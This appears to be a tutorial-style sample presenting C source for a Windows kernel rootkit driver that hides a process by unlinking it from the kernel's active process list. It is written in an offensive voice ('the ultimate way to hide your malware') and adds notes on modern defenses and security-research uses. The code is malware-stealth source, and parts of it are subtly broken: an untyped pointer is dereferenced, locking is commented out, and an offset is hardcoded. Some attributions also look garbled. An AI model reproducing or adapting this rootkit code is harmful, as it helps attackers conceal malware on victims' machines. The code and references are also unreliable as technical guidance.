
# Sample 4: Windows Kernel-Mode Driver for Stealth

**Category**: Rootkit Development / System Programming
**Relevance Period**: Windows NT Family (Windows NT 4.0, 2000, XP, 7, 8, 10, 11). Techniques evolve but the core concept remains.

## Overview

Welcome to the big leagues. Kernel mode (Ring 0 on x86) is where the magic happens. It's the land of no rules, no memory protection (from the CPU's perspective), and ultimate power. It's also the land of the **Blue Screen of Death (BSOD)** if you screw up.

Writing a kernel driver is the ultimate way to hide your malware, intercept system calls, hide files/processes/registry keys, and generally own the machine. This sample demonstrates the skeleton of a driver that could be used to **hide a process** by manipulating kernel data structures – a technique famously used by the **FuRootkit** and countless others.

The basic idea:
1.  **Write a Driver**: Create a `.sys` file and a `.inf` file for installation.
2.  **Load the Driver**: Use a tool like **SC (sc create)** or **OSL Loader** (on older, unprotected systems).
3.  **Find System Structures**: Locate critical, undocumented structures like the **Process List Head** (`PsActiveProcessHead`) or the **System Service Table (SSDT)**.
4.  **Manipulate Them**: Unlink your target process from the process list. `taskmgr.exe` and `pslist.exe` will now be blind to it. The process is still running, just hidden.

**⚠️ WARNING:** This code is a conceptual example. Modern Windows versions (Windows 10 x64 with PatchGuard, DSE, and HVCI) will detect and prevent these modifications, leading to an instant BSOD. This is for historical/educational context only.

## The Code (Conceptual C for Windows Driver Framework)

```c
// For context: This would be written for the Windows Driver Kit (WDK)
// and target an older OS like Windows XP SP3 x86.

#include <ntddk.h>

// External declaration of the undocumented PsActiveProcessHead pointer.
// This is found by "pattern scanning" or using exported kernel symbols on older OSes.
extern PVOID PsActiveProcessHead;

// Our driver's unload routine (mandatory)
VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    DbgPrint("Rootkit driver unloading. Hiding is for the best.\n");
    // Here you would RE-LINK the hidden process back into the list to avoid crashes on unload.
    // But a real rootkit probably wouldn't have an unload routine ;)
}

// Function to hide a process by its PID
NTSTATUS HideProcess(ULONG pidToHide) {
    PLIST_ENTRY listEntry;
    PEPROCESS pCurrentProcess = NULL;

    // Sanity check
    if (!PsActiveProcessHead) {
        return STATUS_UNSUCCESSFUL;
    }

    // Acquire a lock that protects the process list (very important!)
    // This is a simplified example. Real locking is more complex.
    // KeAcquireSpinLock(&PsLoadedModuleSpinLock);

    // Walk the active process list
    for (listEntry = PsActiveProcessHead->Flink;
         listEntry != PsActiveProcessHead;
         listEntry = listEntry->Flink) {

        // Get the EPROCESS structure which is CONTAINING the LIST_ENTRY
        pCurrentProcess = (PEPROCESS)((UCHAR*)listEntry - 0x88); // <- This offset (0x88) is for Win XP. It changes EVERY OS version!
        ULONG currentPid = (ULONG)PsGetProcessId(pCurrentProcess); // Get PID from EPROCESS

        if (currentPid == pidToHide) {
            DbgPrint("Hiding PID: %lu\n", pidToHide);

            // This is the classic DKOM (Direct Kernel Object Manipulation) technique.
            // Manipulate the pointers in the linked list to "unlink" our target.
            // The classic "rootkit 101" move.

            LIST_ENTRY* prevEntry = listEntry->Blink;
            LIST_ENTRY* nextEntry = listEntry->Flink;

            // Make the previous entry point to the next, skipping us.
            prevEntry->Flink = nextEntry;
            // Make the next entry point to the previous, skipping us.
            nextEntry->Blink = prevEntry;

            // For extra stealth, we should also point our list entry to itself
            // to avoid detection by some simple scanners.
            listEntry->Flink = listEntry;
            listEntry->Blink = listEntry;

            // KeReleaseSpinLock(&PsLoadedModuleSpinLock, oldIrql);
            return STATUS_SUCCESS;
        }
    }

    // KeReleaseSpinLock(&PsLoadedModuleSpinLock, oldIrql);
    return STATUS_NOT_FOUND;
}

// Driver entry point (mandatory)
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    NTSTATUS status = STATUS_SUCCESS;
    ULONG pidToHide = 1234; // The PID we want to hide. Would be passed in via IOCTL.

    DbgPrint("Rootkit driver loaded. Welcome to Ring 0, sucka!\n");

    // Set the unload function
    DriverObject->DriverUnload = DriverUnload;

    // Let's hide a process!
    status = HideProcess(pidToHide);

    return status;
}
```

## The Catch: Why This is (Mostly) History

Modern Windows defenses have turned the kernel into a fortress:
1.  **Kernel Patch Protection (PatchGuard)**: On x64 systems, PatchGuard periodically checks the integrity of critical kernel structures like the process list, SSDT, IDT, and GDT. If it finds a modification, it triggers a **BSOD** with code `CRITICAL_STRUCTURE_CORRUPTION`. Game over.
2.  **Driver Signature Enforcement (DSE)**: Windows 64-bit requires all drivers to be digitally signed by a certificate trusted by Microsoft. You can't just load any random `.sys` file you downloaded from the internet anymore. This stopped a lot of public rootkit research dead in its tracks.
3.  **Hypervisor-Protected Code Integrity (HVCI)**: Part of Windows Defender System Guard. It uses the CPU's virtualization features to create a isolated environment that enforces code integrity checks, making it even harder to load unsigned code or modify kernel memory.
4.  **kCFG (Kernel Control Flow Guard)**: Prevents hijacking of kernel function calls, mitigating exploitation techniques.

## CTF & Practical Applications

This knowledge is absolutely **critical** for:
*   **Kernel Exploitation**: Understanding kernel structures is step one in writing kernel exploits.
*   **Reverse Engineering & Malware Analysis**: To analyze modern rootkits (e.g., **TDL4**, **ZeroAccess**), you must understand what they are trying to do to the kernel.
*   **Advanced CTF Challenges**: "Kernel pwn" challenges in CTFs often involve exploiting a vulnerable kernel driver to read/write kernel memory and escalate privileges. Platforms like **TryHackMe** and **HackTheBox** have machines dedicated to this .
*   **Security Product Development**: EDRs (Endpoint Detection and Response) and antivirus software work by hooking kernel functions themselves to monitor behavior. Understanding the battlefield is key.

## References & Further Reading

1.  **[MSDN: Windows Driver Documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/)**: The official starting point. Dense but essential.
2.  **"Windows Internals" by Pavel Yosifovich, Mark Russinovich, David Solomon, and Alex Ionescu**: The absolute bible for anyone wanting to understand the Windows kernel. Part 1 is especially relevant.
3.  **"Subverting Windows Kernel" by Phrack Magazine**: The classic paper by Greg Hoglund that started it all.
4.  **"Rootkit.com" (Archive)**: The legendary repository of rootkit code and research. A historical goldmine.
5.  **OSR Online**: The community for Windows driver developers. Their forums are a wealth of knowledge.

